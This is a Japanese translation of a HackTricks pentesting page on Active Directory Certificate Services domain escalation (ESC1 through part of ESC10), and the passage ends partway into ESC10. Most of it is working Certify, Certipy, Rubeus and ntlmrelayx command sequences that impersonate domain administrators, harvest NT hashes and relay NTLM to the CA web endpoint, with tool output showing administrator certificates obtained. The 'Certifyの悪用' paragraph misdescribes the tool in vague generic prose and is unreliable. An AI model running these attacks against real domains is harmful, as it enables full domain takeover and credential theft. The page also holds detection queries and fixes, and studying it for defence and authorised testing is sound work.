# AD CS ドメインエスカレーション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 設定ミスの証明書テンプレート - ESC1

### 説明

* **エンタープライズCA**は、**低特権ユーザーに登録権限を付与**します。
* **マネージャーの承認は無効**になっています。
* **承認された署名は必要ありません**。
* 過度に許可された**証明書テンプレート**のセキュリティ記述子は、**低特権ユーザーに証明書の登録権限を付与**します。
* **証明書テンプレートは認証を有効にするEKUを定義**します：
* _クライアント認証（OID 1.3.6.1.5.5.7.3.2）、PKINITクライアント認証（1.3.6.1.5.2.3.4）、スマートカードログオン（OID 1.3.6.1.4.1.311.20.2.2）、任意の目的（OID 2.5.29.37.0）、またはEKUなし（SubCA）_
* **証明書テンプレートは、CSRでsubjectAltNameを指定することを要求することができます**：
* **AD**は、証明書の**subjectAltName**（SAN）フィールドで指定された**アイデンティティを使用**します**（存在する場合）。したがって、リクエスタがCSRでSANを指定できる場合、リクエスタは**任意の主体**（たとえば、ドメイン管理者ユーザー）として証明書を要求できます。証明書テンプレートのADオブジェクトは、リクエスタが**`mspki-certificate-name-`**`flag`プロパティでSANを指定できるかどうかを**指定**します。`mspki-certificate-name-flag`プロパティは**ビットマスク**であり、**`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`**フラグが**存在する**場合、リクエスタはSANを指定できます。

{% hint style="danger" %}
これらの設定により、**低特権ユーザーが任意のSANを持つ証明書を要求**できるようになり、低特権ユーザーはKerberosまたはSChannelを介してドメイン内の任意の主体として認証できます。
{% endhint %}

これは、たとえば、製品や展開サービスがHTTPS証明書を生成したり、ホスト証明書を動的に生成するために有効にされることがよくあります。または、知識の不足のためです。

この最後のオプションを持つ証明書が作成されると、**警告が表示**されますが、この構成で**証明書テンプレート**が**複製**される場合は表示されません（`WebServer`テンプレートの場合、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`が有効になっており、管理者が認証OIDを追加する可能性があります）。

### 悪用

**脆弱な証明書テンプレートを見つける**には、次のコマンドを実行します：
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
この脆弱性を悪用して管理者をなりすますためには、次のコマンドを実行することができます。
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
次に、生成された**証明書を`.pfx`形式に変換**し、再びRubeusまたはcertipyを使用して**認証に使用**することができます。
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windowsバイナリ「Certreq.exe」と「Certutil.exe」は、PFXを生成するために悪用される可能性があります：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

さらに、ADフォレストの構成スキーマに対して実行される次のLDAPクエリは、承認/署名が不要で、クライアント認証またはスマートカードログオンEKUを持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`フラグが有効になっている**証明書テンプレート**を**列挙**するために使用できます：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 設定ミスのある証明書テンプレート - ESC2

### 説明

2番目の悪用シナリオは、最初のもののバリエーションです：

1. エンタープライズCAは、低特権ユーザーに対して登録権限を付与します。
2. マネージャーの承認は無効になっています。
3. 承認された署名は必要ありません。
4. 過度に許可された証明書テンプレートのセキュリティ記述子が、低特権ユーザーに証明書の登録権限を付与します。
5. **証明書テンプレートには、Any Purpose EKUまたはEKUが定義されていません。**

**Any Purpose EKU**は、攻撃者がクライアント認証、サーバー認証、コード署名などの**任意の目的**のために**証明書**を取得することを可能にします。この場合も、ESC3と同じ**手法**を使用してこれを悪用することができます。

**EKUのない証明書**（下位CA証明書）も同様に**任意の目的**に悪用される可能性がありますが、**新しい証明書に署名するためにも使用できます**。そのため、下位CA証明書を使用して、攻撃者は新しい証明書に**任意のEKUやフィールドを指定**することができます。

ただし、**下位CAが`NTAuthCertificates`オブジェクトによって信頼されていない**場合（デフォルトではそうではありません）、攻撃者は**ドメイン認証**に対して機能する**新しい証明書を作成することはできません**。それでも、攻撃者は**任意のEKU**と任意の証明書値を持つ**新しい証明書を作成**することができます。これには、悪用の可能性があります（たとえば、コード署名、サーバー認証など）し、SAML、AD FS、IPSecなどのネットワーク内の他のアプリケーションに大きな影響を与える可能性があります。

以下のLDAPクエリは、ADフォレストの構成スキーマに対して実行されると、このシナリオに一致するテンプレートを列挙するために使用できます：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 設定ミスの登録エージェントテンプレート - ESC3

### 説明

このシナリオは、最初と2番目とは異なるEKU（証明書リクエストエージェント）と2つの異なるテンプレートを悪用するものです。

Microsoftのドキュメントでは「登録エージェント」として知られる**証明書リクエストエージェントEKU**（OID 1.3.6.1.4.1.311.20.2.1）は、**他のユーザーの代わりに証明書の登録**を行うためのプリンシパルを許可します。

「登録エージェント」は、このような**テンプレート**に登録し、結果として得られた**証明書を他のユーザーの代わりにCSRに共同署名**します。その後、**共同署名されたCSR**をCAに送信し、**「代理で登録」を許可するテンプレート**に登録し、CAは「他の」ユーザーに属する証明書を返します。

**要件1：**

1. エンタープライズCAは、低特権ユーザーに対して登録権限を許可します。
2. マネージャーの承認は無効になっています。
3. 承認された署名は必要ありません。
4. 過度に許可された証明書テンプレートのセキュリティ記述子により、低特権ユーザーに証明書の登録権限が与えられます。
5. **証明書テンプレートは、証明書リクエストエージェントEKUを定義**しています。証明書リクエストエージェントOID（1.3.6.1.4.1.311.20.2.1）は、他のプリンシパルのために他の証明書テンプレートを要求するために使用されます。

**要件2：**

1. エンタープライズCAは、低特権ユーザーに対して登録権限を許可します。
2. マネージャーの承認は無効になっています。
3. **テンプレートのスキーマバージョンが1以上であり、証明書リクエストエージェントEKUを要求するアプリケーションポリシー発行要件が指定されています。**
4. 証明書テンプレートは、ドメイン認証を許可するEKUを定義しています。
5. 登録エージェントの制限はCAに実装されていません。

### 悪用

[**Certify**](https://github.com/GhostPack/Certify)または[**Certipy**](https://github.com/ly4k/Certipy)を使用して、このシナリオを悪用することができます。
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Enterprise CAsは、`certsrc.msc`スナップインを開き、CAを右クリックしてプロパティをクリックし、「Enrollment Agents」タブに移動することで、**誰が登録エージェント証明書を取得できるか**、**エージェントが登録できるテンプレート**、およびエージェントが**代理でアクションを実行できるアカウント**を**制約**することができます。

ただし、**デフォルトの**CA設定は「**登録エージェントを制限しない**」です。管理者が「登録エージェントを制限する」を有効にしても、デフォルトの設定は非常に許容範囲が広く、誰でも誰のテンプレートでもアクセスできるようになっています。

## 脆弱な証明書テンプレートのアクセス制御 - ESC4

### **説明**

**証明書テンプレート**には、特定の**ADプリンシパル**がテンプレートに対して特定の**権限を持つかどうかを指定するセキュリティ記述子**があります。

もし**攻撃者**が**テンプレートを変更**し、前のセクションで説明した**脆弱性のある設定**を作成するために十分な**権限**を持っている場合、それを悪用して**特権をエスカレート**させることができます。

証明書テンプレートに関する興味深い権限:

* **Owner:** オブジェクトの暗黙のフルコントロール権限で、任意のプロパティを編集できます。
* **FullControl:** オブジェクトのフルコントロール権限で、任意のプロパティを編集できます。
* **WriteOwner:** 攻撃者が制御するプリンシパルに所有者を変更できます。
* **WriteDacl**: 攻撃者にフルコントロールを付与するためにアクセス制御を変更できます。
* **WriteProperty:** 任意のプロパティを編集できます。

### 悪用方法

前述のような特権昇格の例:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4は、ユーザーが証明書テンプレートに対して書き込み権限を持っている場合の特権昇格です。これは、例えば証明書テンプレートの構成を上書きしてテンプレートをESC1に対して脆弱にするために悪用される可能性があります。

上記のパスでわかるように、これらの権限を持っているのは`JOHNPC`だけですが、私たちのユーザー`JOHN`は`JOHNPC`に対して新しい`AddKeyCredentialLink`エッジを持っています。この攻撃は証明書に関連しているため、[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)としても知られるこの攻撃も実装しています。以下は、被害者のNTハッシュを取得するためのCertipyの`shadow auto`コマンドの一部です。

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy**は、単一のコマンドで証明書テンプレートの構成を上書きすることができます。デフォルトでは、Certipyは構成を上書きしてESC1に対して脆弱にします。また、攻撃後の構成の**復元**に役立つため、**`-save-old`パラメータを指定して古い構成を保存**することもできます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 脆弱なPKIオブジェクトのアクセス制御 - ESC5

### 説明

AD CSのセキュリティに影響を与えるACLベースの相互接続されたウェブは広範囲です。証明書テンプレートや証明機関自体以外のいくつかのオブジェクトが、AD CSシステム全体のセキュリティに影響を与える可能性があります。これには以下が含まれます（ただし、これに限定されません）：

* CAサーバーのADコンピュータオブジェクト（S4U2SelfまたはS4U2Proxyを介した侵害）
* CAサーバーのRPC/DCOMサーバー
* `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`のコンテナ内の任意の子孫ADオブジェクトまたはコンテナ（証明書テンプレートコンテナ、認証機関コンテナ、NTAuthCertificatesオブジェクト、登録サービスコンテナなど）

低特権の攻撃者がこれらのいずれかを制御できる場合、攻撃はおそらくPKIシステムを危険にさらすことができます。

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

もう1つの類似の問題があり、[**CQure Academyの投稿**](https://cqureacademy.com/blog/enhanced-key-usage)で説明されています。これは**`EDITF_ATTRIBUTESUBJECTALTNAME2`**フラグに関連しています。Microsoftによれば、「このフラグがCAに設定されている場合、（Active Directory®からサブジェクトが構築される場合を含む）**任意のリクエスト**には**ユーザー定義の値**が**代替名**に含まれる可能性があります。」\
これは、**攻撃者**が、ドメイン**認証**に構成された**任意のテンプレート**に登録し、（たとえば、デフォルトのユーザーテンプレートなど）**特権のないユーザー**が登録できる証明書を取得し、ドメイン管理者（または**他のアクティブなユーザー/マシン**）として認証することができることを意味します。

**注意**: ここでの**代替名**は、CSRに`certreq.exe`の`-attrib "SAN:"`引数を使用して含まれます（つまり、「名前値ペア」）。これは、ESC1でSANを悪用する方法とは異なり、アカウント情報を証明書の拡張子ではなく証明書属性に格納する方法です。

### 悪用

組織は、次の`certutil.exe`コマンドを使用して、この設定が有効になっているかどうかを確認できます。
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
以下は単に**リモート****レジストリ**を使用しているため、次のコマンドも機能する場合があります：
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify)と[**Certipy**](https://github.com/ly4k/Certipy)もこれをチェックし、この設定ミスを悪用するために使用することができます。
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定は、ドメイン管理者（または同等の権限を持つユーザー）の権限がある場合、どのシステムからでも**設定**することができます。
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
もし環境でこの設定を見つけた場合、次のコマンドでこのフラグを**削除**できます:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
2022年5月のセキュリティ更新後、新しい**証明書**には、**セキュリティ拡張機能**が埋め込まれます。この拡張機能は、**要求者の`objectSid`プロパティ**を反映します。ESC1では、このプロパティは指定されたSANから反映されますが、**ESC6**では、このプロパティはSANからではなく、**要求者の`objectSid`**から反映されます。\
したがって、**ESC6を悪用するには**、環境が**ESC10に対して脆弱**である必要があります（弱い証明書マッピング）。この場合、新しいセキュリティ拡張機能よりもSANが優先されます。
{% endhint %}

## 脆弱な証明書機関のアクセス制御 - ESC7

### 攻撃1

#### 説明

証明書機関自体には、さまざまな**CAアクション**を保護するための**権限セット**があります。これらの権限は、`certsrv.msc`にアクセスし、CAを右クリックしてプロパティを選択し、セキュリティタブに切り替えることでアクセスできます。

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

これは、[**PSPKIのモジュール**](https://www.pkisolutions.com/tools/pspki/)を使用して`Get-CertificationAuthority | Get-CertificationAuthorityAcl`で列挙することもできます。
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
#### 悪用

**`ManageCA`** 権限を持つプリンシパルが **証明書機関** 上で利用可能な場合、**PSPKI** を使用して **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ビットをリモートで切り替え、任意のテンプレートで **SAN を許可** することができます（[ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)）：

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

これは、[**PSPKI の Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) コマンドレットを使用して、より簡単な形式でも可能です。

**`ManageCertificates`** 権限は、**保留中のリクエストを承認** することを許可し、したがって「CA 証明書マネージャーの承認」保護をバイパスします。

**Certify** と **PSPKI** モジュールの **組み合わせ**を使用して、証明書のリクエスト、承認、およびダウンロードを行うことができます：
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### 攻撃2

#### 説明

{% hint style="warning" %}
**前の攻撃**では、**`Manage CA`** 権限を使用して、**EDITF\_ATTRIBUTESUBJECTALTNAME2** フラグを有効にして **ESC6 攻撃**を実行しましたが、これは CA サービス (`CertSvc`) が再起動されるまで効果がありません。ユーザーが `Manage CA` アクセス権を持っている場合、ユーザーはサービスを再起動することも許可されます。ただし、ユーザーがリモートでサービスを再起動できるわけではありません。さらに、**ESC6 は、2022 年 5 月のセキュリティ更新により、ほとんどのパッチ済み環境ではデフォルトで機能しない可能性があります**。
{% endhint %}

したがって、ここでは別の攻撃が提示されています。

前提条件：

* **`ManageCA` 権限のみ**
* **`Manage Certificates`** 権限（**`ManageCA`** から付与できます）
* 証明書テンプレート **`SubCA`** が **有効化**されている必要があります（**`ManageCA`** から有効化できます）

この技術は、`Manage CA` および `Manage Certificates` アクセス権を持つユーザーが **失敗した証明書リクエストを発行**できることに依存しています。**`SubCA`** 証明書テンプレートは **ESC1 に脆弱**ですが、**管理者のみ**がテンプレートに登録できます。したがって、**ユーザー**は **`SubCA`** に登録をリクエストすることができますが、**拒否**されますが、その後で **マネージャーによって発行**されます。

#### 悪用

自分自身を新しいオフィサーとして追加することで、**`Manage Certificates`** アクセス権を自分に付与することができます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** テンプレートは、`-enable-template` パラメータを使用して CA で有効にすることができます。デフォルトでは、`SubCA` テンプレートは有効になっています。
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
もし攻撃のための前提条件を満たしている場合、まずは「SubCA」テンプレートに基づいて証明書をリクエストします。

このリクエストは**拒否**されますが、私たちは秘密鍵を保存し、リクエストIDをメモしておきます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
私たちの**`Manage CA`と`Manage Certificates`**を使用して、`ca`コマンドと`-issue-request <request ID>`パラメータを使用して、**失敗した証明書のリクエストを発行**することができます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
そして最後に、`req`コマンドと`-retrieve <リクエストID>`パラメータを使用して、**発行された証明書を取得**することができます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relayを使用したAD CS HTTPエンドポイントへの攻撃 - ESC8

### 説明

{% hint style="info" %}
要約すると、もし環境に**AD CSがインストールされていて**、**脆弱なWeb登録エンドポイント**と、少なくとも**ドメインコンピュータの登録とクライアント認証を許可する**（デフォルトの**`Machine`**テンプレートのような）**公開された証明書テンプレートがある**場合、**スプーラーサービスが実行されている任意のコンピュータを攻撃者が侵害できます**！
{% endhint %}

AD CSは、管理者がインストールできる追加のAD CSサーバーロールを介して、いくつかの**HTTPベースの登録方法**をサポートしています。これらのHTTPベースの証明書登録インターフェースは、すべて**脆弱なNTLMリレーアタック**です。NTLMリレーを使用すると、**侵害されたマシン上の攻撃者は、受信NTLM認証を行うADアカウントをなりすます**ことができます。攻撃者は、被害者アカウントをなりすまし、これらのWebインターフェースにアクセスし、`User`または`Machine`証明書テンプレートに基づいてクライアント認証証明書を要求することができます。

* **Web登録インターフェース**（`http://<caserver>/certsrv/`でアクセス可能な古い外観のASPアプリケーション）は、デフォルトではHTTPのみをサポートしており、NTLMリレーアタックに対して保護することはできません。さらに、明示的にAuthorization HTTPヘッダーを介したNTLM認証のみを許可しているため、Kerberosのようなより安全なプロトコルは使用できません。
* **証明書登録サービス**（CES）、**証明書登録ポリシー**（CEP）Webサービス、および**ネットワークデバイス登録サービス**（NDES）は、デフォルトでAuthorization HTTPヘッダーを介したネゴシエート認証をサポートしています。ネゴシエート認証は、KerberosとNTLMの両方をサポートしており、そのため、リレーアタック中に攻撃者はNTLM認証にネゴシエートダウンすることができます。これらのWebサービスはデフォルトでHTTPSを有効にしていますが、残念ながらHTTPS単体ではNTLMリレーアタックから保護することはできません。HTTPSサービスをNTLMリレーアタックから保護するには、HTTPSにチャネルバインディングを組み合わせる必要があります。残念ながら、AD CSはIISで拡張保護を有効にしていないため、チャネルバインディングを有効にするためには必要です。

NTLMリレーアタックの一般的な問題は、**NTLMセッションが通常短い**ことと、攻撃者が**NTLM署名を強制する**サービスとは対話できないことです。

ただし、ユーザーから証明書を取得するためにNTLMリレーアタックを悪用すると、セッションは証明書が有効である限り継続し、証明書を使用して**NTLM署名を強制する**サービスを利用することができます。盗まれた証明書の使用方法については、次を参照してください：

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLMリレーアタックのもう一つの制限は、**被害者アカウントが攻撃者が制御するマシンに認証する必要がある**ということです。攻撃者は待つか、強制することができます：

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **悪用方法**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify)の`cas`コマンドを使用すると、**有効なHTTP AD CSエンドポイント**を列挙できます：
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

エンタープライズCAは、**ADオブジェクト内の`msPKI-Enrollment-Servers`プロパティにCESエンドポイントを保存**します。**Certutil.exe**と**PSPKI**は、これらのエンドポイントを解析してリスト化することができます。
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Certifyの悪用

Certifyは、Windows Active Directory環境で証明書を管理するためのツールです。このツールを悪用することで、特権の昇格や権限の拡大が可能となります。

Certifyの悪用には、以下の手法があります。

1. **証明書の偽装**: Certifyを使用して証明書を作成し、信頼された証明機関（CA）のように偽装することができます。これにより、攻撃者は信頼された証明書を使用して、システムへのアクセス権を取得することができます。

2. **証明書の盗難**: Certifyを使用して証明書を盗み、攻撃者自身がその証明書を使用することで、システムへのアクセス権を取得することができます。

3. **証明書の改ざん**: Certifyを使用して証明書を改ざんし、信頼された証明機関（CA）のように見せかけることができます。これにより、攻撃者は改ざんされた証明書を使用して、システムへのアクセス権を取得することができます。

Certifyの悪用により、攻撃者はシステム内での特権の昇格や権限の拡大を行うことができます。したがって、Active Directory環境でCertifyを使用する場合は、適切なセキュリティ対策を講じることが重要です。
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)の悪用

デフォルトでは、Certipyはリレーアカウント名が`$`で終わる場合は`Machine`または`User`テンプレートに基づいて証明書を要求します。`-template`パラメータを使用して別のテンプレートを指定することも可能です。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam)のような技術を使用して認証を強制することができます。ドメインコントローラの場合、`-template DomainController`を指定する必要があります。
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## セキュリティ拡張なし - ESC9 <a href="#5485" id="5485"></a>

### 説明

ESC9は、新しい**`msPKI-Enrollment-Flag`**値**`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）を指します。このフラグが証明書テンプレートに設定されている場合、**新しい`szOID_NTDS_CA_SECURITY_EXT`セキュリティ拡張**は埋め込まれません。ESC9は、`StrongCertificateBindingEnforcement`が`1`（デフォルト）に設定されている場合にのみ有効です。なぜなら、KerberosまたはSchannelのより弱い証明書マッピング構成をESC10として悪用することができるため、要件は同じであるためです。

* `StrongCertificateBindingEnforcement`が`2`（デフォルト：`1`）に設定されていないか、`CertificateMappingMethods`に`UPN`フラグが含まれている
* 証明書に`msPKI-Enrollment-Flag`値の`CT_FLAG_NO_SECURITY_EXTENSION`フラグが含まれている
* 証明書が任意のクライアント認証EKUを指定している
* 任意のアカウントAに対して`GenericWrite`を使用して任意のアカウントBを侵害する

### 悪用方法

この場合、`John@corp.local`は`Jane@corp.local`に対して`GenericWrite`を持っており、`Administrator@corp.local`を侵害したいとします。`Jane@corp.local`は、`msPKI-Enrollment-Flag`値の`CT_FLAG_NO_SECURITY_EXTENSION`フラグが設定されている証明書テンプレート`ESC9`に登録することが許可されています。

まず、`Jane`のハッシュを取得します。たとえば、Shadow Credentialsを使用して行います（`GenericWrite`を使用）。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

次に、`Jane`の`userPrincipalName`を`Administrator`に変更します。`@corp.local`の部分は省略していることに注意してください。

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

これは制約違反ではありません。なぜなら、`Administrator`ユーザーの`userPrincipalName`は`Administrator@corp.local`ではなく`Administrator`だからです。

次に、脆弱な証明書テンプレート`ESC9`をリクエストします。証明書は`Jane`としてリクエストする必要があります。

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

証明書の`userPrincipalName`が`Administrator`であり、発行された証明書には「オブジェクトSID」が含まれていないことに注意してください。

その後、`Jane`の`userPrincipalName`を元の`Jane@corp.local`など別のものに戻します。

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

これで、証明書で認証しようとすると、`Administrator@corp.local`ユーザーのNTハッシュが受け取れます。証明書にドメインが指定されていないため、コマンドラインに`-domain <domain>`を追加する必要があります。

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## 弱い証明書マッピング - ESC10

### 説明

ESC10は、ドメインコントローラ上の2つのレジストリキー値を指します。

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`。デフォルト値は`0x18`（`0x8 | 0x10`）、以前は`0x1F`でした。

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`。デフォルト値は`1`、以前は`0`でした。

**ケース1**

`StrongCertificateBindingEnforcement`が`0`に設定されている

**ケース2**

`CertificateMappingMethods`に`UPN`ビット（`0x4`）が含まれている

